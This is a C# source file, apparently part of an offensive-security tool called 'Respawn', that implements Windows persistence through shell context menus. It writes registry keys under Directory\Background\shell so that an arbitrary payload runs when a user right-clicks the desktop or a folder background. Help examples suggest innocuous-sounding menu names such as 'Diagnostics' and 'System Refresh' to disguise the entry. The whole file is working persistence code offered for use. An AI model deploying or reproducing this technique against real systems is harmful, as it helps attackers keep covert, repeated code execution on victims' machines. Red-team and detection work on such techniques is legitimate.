using System;
using System.Collections.Generic;
using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.ContextMenu
{
    public class ContextMenuModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "menu";
        public string Name        => "Context Menu Persistence";
        public string Mitre       => "";    
        public string Description => "Persist by abusing Windows Shell Context Menus to register a custom command that executes whenever a user right-clicks the background of their desktop or a folder.";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p2", "keys");

            // 2. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-k,  --key", "Target Key ID (e.g. 'hkcu-menu')");
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Menu Name / Display Text (e.g. 'System Refresh')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Command to execute (exe, script, or built-in tool)");
            Console.WriteLine();

            // 3. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t menu -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t menu -a install -k hkcu-menu -n \"Diagnostics\" -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t menu -a verify  -k hkcu-menu -n \"Diagnostics\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t menu -a remove  -k hkcu-menu -n \"Diagnostics\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return ContextMenuKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = ContextMenuKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key id '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                using var baseKey = OpenForWrite(ctx.Key, create: true);
                if (baseKey == null)
                    return TechniqueResult.Denied($"Access denied opening registry key: {key.Path}");

                using var existingMenu = baseKey.OpenSubKey(ctx.Name);
                if (existingMenu != null)
                    return TechniqueResult.Exists($"Menu item '{ctx.Name}' already exists under {key.Path}");

                // Create the visible menu key
                using var menuKey = baseKey.CreateSubKey(ctx.Name);
                if (menuKey == null)
                    return TechniqueResult.Fail($"Failed to create subkey '{ctx.Name}'");

                // Set the display text
                menuKey.SetValue("", ctx.Name);

                // Create the command execution subkey
                using var commandKey = menuKey.CreateSubKey("command");
                if (commandKey == null)
                    return TechniqueResult.Fail("Failed to create 'command' subkey.");

                // Wrap the payload in quotes to ensure paths with spaces execute properly
                commandKey.SetValue("", $"\"{ctx.Payload}\"");

                return TechniqueResult.Ok($"Installed '{ctx.Name}' -> '{ctx.Payload}' under {key.Path}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Key '{ctx.Key}' requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var key = ContextMenuKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key id '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                using var baseKey = OpenForWrite(ctx.Key, create: false);
                if (baseKey == null)
                    return TechniqueResult.NotFound($"Registry key not found: {key.Path}");

                using var existingMenu = baseKey.OpenSubKey(ctx.Name);
                if (existingMenu == null)
                    return TechniqueResult.NotFound($"Menu item '{ctx.Name}' not found under {key.Path}");

                baseKey.DeleteSubKeyTree(ctx.Name);
                return TechniqueResult.Ok($"Removed '{ctx.Name}' from {key.Path}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Key '{ctx.Key}' requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var key = ContextMenuKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key id '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                using var baseKey = OpenForRead(ctx.Key);
                if (baseKey == null)
                    return TechniqueResult.NotFound($"Registry key not found: {key.Path}");

                using var menuKey = baseKey.OpenSubKey(ctx.Name);
                if (menuKey == null)
                    return TechniqueResult.NotFound($"Menu item '{ctx.Name}' not found under {key.Path}");

                using var commandKey = menuKey.OpenSubKey("command");
                if (commandKey == null)
                    return TechniqueResult.NotFound($"'command' subkey not found for '{ctx.Name}'");

                var value = commandKey.GetValue("")?.ToString();
                if (value == null)
                    return TechniqueResult.NotFound($"Execution value not found inside '{ctx.Name}\\command'");

                return TechniqueResult.Ok($"Verified '{ctx.Name}' -> '{value}' under {key.Path}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Key '{ctx.Key}' requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Key))
            {
                error = "No key specified. Use -k <key-id> or see -a list-keys.";
                return false;
            }
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <payload>.";
                return false;
            }
            error = string.Empty;
            return true;
        }

        private RegistryKey? OpenForWrite(string keyId, bool create)
        {
            var (hive, path) = ResolvePath(keyId);
            return create
                ? hive.CreateSubKey(path, writable: true)
                : hive.OpenSubKey(path, writable: true);
        }

        private RegistryKey? OpenForRead(string keyId)
        {
            var (hive, path) = ResolvePath(keyId);
            return hive.OpenSubKey(path, writable: false);
        }

        private (RegistryKey hive, string path) ResolvePath(string keyId)
        {
            return keyId.ToLower() switch
            {
                "hkcr-menu" => (Microsoft.Win32.Registry.ClassesRoot, @"Directory\Background\shell"),
                "hkcu-menu" => (Microsoft.Win32.Registry.CurrentUser,  @"Software\Classes\Directory\Background\shell"),
                _                           => throw new ArgumentException($"Unknown key id: {keyId}")
            };
        }
    }
}